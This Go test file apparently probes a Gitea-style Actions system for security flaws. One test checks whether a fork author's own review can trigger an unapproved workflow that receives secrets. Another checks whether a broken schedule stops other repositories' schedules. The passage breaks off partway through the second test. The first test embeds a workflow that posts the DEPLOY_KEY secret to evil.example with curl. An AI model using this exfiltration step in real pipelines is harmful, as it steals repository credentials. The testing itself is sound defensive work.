// 1. fork PR + review event
func TestProbeA_ForkPRReview(t *testing.T) {
	runner, repo, _ := pSetup(t)
	ctx := t.Context()
	_, err := secret_model.InsertEncryptedSecret(ctx, 0, 4, "DEPLOY_KEY", "s3cr3t", "")
	require.NoError(t, err)
	base := pCommit(t, map[string]string{"ci.yml": "on: pull_request\njobs:\n  test:\n    runs-on: probe-linux\n    steps:\n      - run: make test\n"})
	pGit(t, nil, "", "update-ref", "refs/heads/master", base)
	forkWf := "name: added-by-fork\non:\n  pull_request_review:\njobs:\n  grab:\n    runs-on: probe-linux\n    steps:\n      - run: curl -d \"$K\" https://evil.example\n        env:\n          K: ${{ secrets.DEPLOY_KEY }}\n"
	head := pCommit(t, map[string]string{"ci.yml": "on: pull_request\njobs:\n  test:\n    runs-on: probe-linux\n    steps:\n      - run: make test\n", "pwn.yml": forkWf})
	pGit(t, nil, "", "update-ref", "refs/pull/77/head", head)

	forkAuthor := unittest.AssertExistsAndLoadBean(t, &user_model.User{ID: 4})
	issue := &issues_model.Issue{RepoID: 4, Index: 77, PosterID: forkAuthor.ID, Title: "tiny fix", IsPull: true}
	require.NoError(t, db.Insert(ctx, issue))
	pr := &issues_model.PullRequest{IssueID: issue.ID, Index: 77, HeadRepoID: 11, BaseRepoID: 4, HeadBranch: "patch-1", BaseBranch: "master", Flow: issues_model.PullRequestFlowGithub}
	require.NoError(t, db.Insert(ctx, pr))
	issue.Repo, issue.Poster = repo, forkAuthor
	perm := "?"
	if p, err := ifNeedApproval(ctx, &actions_model.ActionRun{IsForkPullRequest: true, TriggerEvent: "pull_request"}, repo, forkAuthor); err == nil {
		perm = fmt.Sprint(p)
	}
	t.Logf("control: an ordinary pull_request run from this author on this fork PR would need approval: %s", perm)

	before := pLatestRun(t)
	review := &issues_model.Review{Type: issues_model.ReviewTypeComment, Reviewer: forkAuthor, ReviewerID: forkAuthor.ID, Issue: issue, IssueID: issue.ID, CommitID: head, Content: "lgtm"}
	NewNotifier().PullRequestReview(ctx, pr, review, nil, nil) // the author leaves a comment review on their own PR
	run := pLatestRun(t)
	if run == nil || (before != nil && run.ID == before.ID) {
		t.Logf("no run was created by the review")
		return
	}
	t.Logf("review created run: workflow=%s event=%s is_fork_pr=%v need_approval=%v commit=%s (fork head=%s) status=%s",
		run.WorkflowID, run.Event, run.IsForkPullRequest, run.NeedApproval, run.CommitSHA[:8], head[:8], run.Status)
	task, rt := pClaim(t, runner)
	if rt != nil {
		t.Logf("runner claimed job %q straight away; secrets handed over: %s", task.Job.Name, pSecretNames(rt))
	}
}

// 2. one failing schedule and the rest of the instance
func TestProbeB_ScheduleAbort(t *testing.T) {
	pSetup(t)
	ctx := t.Context()
	// an older, healthy schedule in another repository (user2/repo1)
	require.NoError(t, actions_model.CreateScheduleTask(ctx, []*actions_model.ActionSchedule{{
		Title: "other team", RepoID: 1, OwnerID: 2, WorkflowID: "nightly.yml", TriggerUserID: user_model.ActionsUserID, Ref: "refs/heads/master",
		CommitSHA: "65f1bf27bc3bf70f64657658635e66094edbcb4d", Event: "push", EventPayload: "{}", Specs: []string{"0 3 * * *"}, Content: []byte(nightlyYml),
	}}))
	// a newer schedule in repo4 whose concurrency expression cannot be evaluated
	broken := strings.Replace(nightlyYml, "jobs:", "concurrency:\n  group: ${{ nosuchfunc( }}\njobs:", 1)
	require.NoError(t, actions_model.CreateScheduleTask(ctx, []*actions_model.ActionSchedule{{
		Title: "broken", RepoID: 4, OwnerID: 5, WorkflowID: "broken.yml", TriggerUserID: user_model.ActionsUserID, Ref: "refs/heads/master",
		CommitSHA: "c2d72f548424103f01ee1dc02889c1e2bff816b0", Event: "push", EventPayload: "{}", Specs: []string{"0 3 * * *"}, Content: []byte(broken),
	}}))
	for tick := 1; tick <= 3; tick++ {
		pDue(t)
		err := StartScheduleTasks(ctx)
		n, _ := db.GetEngine(ctx).Where("repo_id = 1 AND schedule_id > 0").Count(new(actions_model.ActionRun))
		short := "<nil>"
		if err != nil {
			short = err.Error()[:60] + "..."
